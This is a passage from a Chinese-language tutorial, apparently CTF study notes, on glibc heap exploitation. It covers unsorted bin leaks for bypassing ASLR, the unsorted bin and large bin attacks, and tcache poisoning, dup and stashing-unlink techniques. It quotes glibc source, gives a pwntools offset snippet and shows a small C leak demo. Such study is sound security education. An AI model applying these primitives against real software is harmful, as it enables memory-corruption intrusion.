<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li>
</ol>
<h3 id="基本使用情况"><a href="#基本使用情况" class="headerlink" title="基本使用情况"></a>基本使用情况</h3><ol>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ol>
<h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><h4 id="Unsorted-Bin-的结构"><a href="#Unsorted-Bin-的结构" class="headerlink" title="Unsorted Bin 的结构"></a>Unsorted Bin 的结构</h4><p><code>Unsorted Bin</code> 在管理时为循环双向链表，若 <code>Unsorted Bin</code> 中有两个 <code>bin</code>，那么该链表结构如下</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20220419191748063.png" alt="image-20220419191748063"></p>
<p>我们可以看到，在该链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。</p>
<h4 id="Leak-原理"><a href="#Leak-原理" class="headerlink" title="Leak 原理"></a>Leak 原理</h4><p>如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过。</p>
<p>那么如何取得 <code>main_arena</code> 与 <code>libc</code> 基址的偏移呢？这里提供两种思路。</p>
<h5 id="通过-malloc-trim-函数得出"><a href="#通过-malloc-trim-函数得出" class="headerlink" title="通过 __malloc_trim 函数得出"></a>通过 __malloc_trim 函数得出</h5><p>在 <code>malloc.c</code> 中有这样一段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__malloc_trim (<span class="keyword">size_t</span> s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"></span><br><span class="line">  mstate ar_ptr = &amp;main_arena;<span class="comment">//&lt;=here!</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line">      result |= mtrim (ar_ptr, s);</span><br><span class="line">      __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">      ar_ptr = ar_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (ar_ptr != &amp;main_arena);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到 <code>mstate ar_ptr = &amp;main_arena;</code> 这里对 <code>main_arena</code> 进行了访问，所以我们就可以通过 IDA 等工具分析出偏移了。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/malloc-trim-ida.png" alt="malloc-trim-ida"></p>
<p>比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。</p>
<h5 id="通过-malloc-hook-直接算出"><a href="#通过-malloc-hook-直接算出" class="headerlink" title="通过 __malloc_hook 直接算出"></a>通过 __malloc_hook 直接算出</h5><p>比较巧合的是，<code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">"libc.so.6"</span>).symbols[<span class="string">"__malloc_hook"</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
<h4 id="实现-Leak-的方法"><a href="#实现-Leak-的方法" class="headerlink" title="实现 Leak 的方法"></a>实现 Leak 的方法</h4><p>一般来说，要实现 leak，需要有 <code>UAF</code>，将一个 <code>chunk</code> 放入 <code>Unsorted Bin</code> 中后再打出其 <code>fd</code>。一般的笔记管理题都会有 <code>show</code> 的功能，对处于链表尾的节点 <code>show</code> 就可以获得 <code>libc</code> 的基地址了。</p>
<p>特别的，<code>CTF</code> 中的利用，堆往往是刚刚初始化的，所以 <code>Unsorted Bin</code> 一般都是干净的，当里面只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中。</p>
<p>另外，如果我们无法做到访问链表尾，但是可以访问链表头，那么在 32 位的环境下，对链表头进行 <code>printf</code> 等往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak。然而在 64 位下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效 leak。</p>
<h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><p>在 <a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/" target="_blank" rel="noopener">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p>
<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>分配跟 large bin 有关的 chunk，要经过 fastbin，unsorted bin，small bin 的分配。</p>
<p>这种攻击方式主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p>
<p>以 2.33 版本的 libc 为例，从 4052 行开始就是对 largebin chunk 的入 bin 操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)</span><br><span class="line">              &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">              == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>在 2.29 及以下的版本中，根据 unsorted chunk 的大小不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>在 unsorted chunk 小于链表中最小的 chunk 的时候会执行前一句，反之执行后一句。</p>
<p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">              == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>所以有两种利用方法。</p>
<p>在 2.30 版本新加入了对 largebin 跳表的完整性检查，使 unsorted chunk 大于链表中最小的 chunk 时的利用失效，必须使 unsorted chunk 小于链表中最小的 chunk，通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>实现利用，也就是将本 chunk 的地址写到 <code>bk_nextsize + 0x20</code> 处。</p>
<h3 id="总结-large-bin-attack-的利用方法"><a href="#总结-large-bin-attack-的利用方法" class="headerlink" title="总结 large bin attack 的利用方法"></a>总结 large bin attack 的利用方法</h3><p>large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：</p>
<ul>
<li>可以修改一个 large bin chunk 的 data</li>
<li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li>
<li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li>
<li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li>
</ul>
<h2 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h2><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li>
</ul>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数会在函数 <code>_int_free</code> 和 <code>__libc_malloc</code> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>在 <code>tcache_get</code> 中，仅仅检查了 <strong>tc_idx</strong> ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
<h3 id="Tcache-Usage"><a href="#Tcache-Usage" class="headerlink" title="Tcache Usage"></a>Tcache Usage</h3><ul>
<li>内存释放：</li>
</ul>
<p>可以看到，在 free 函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入 tcache 结构中。</p>
<ul>
<li>内存申请：</li>
</ul>
<p>在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。</p>
<p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p>
<p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p>
<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p>
<ul>
<li><p>tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。</p>
</li>
<li><p>在循环处理 unsorted bin 内存块时，如果达到放入 unsorted bin 块最大数量，会立即返回。默认是 0，即不存在上限。</p>
</li>
<li><p>在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回。</p>
</li>
</ul>
<h3 id="Pwn-Tcache"><a href="#Pwn-Tcache" class="headerlink" title="Pwn Tcache"></a>Pwn Tcache</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
<h4 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h4><p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p><strong>因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p>
<h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h4><p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
<h4 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h4><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p>
<h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h4><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
<h4 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h4><p>在以前的 libc 版本中，我们只需这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满：</p>
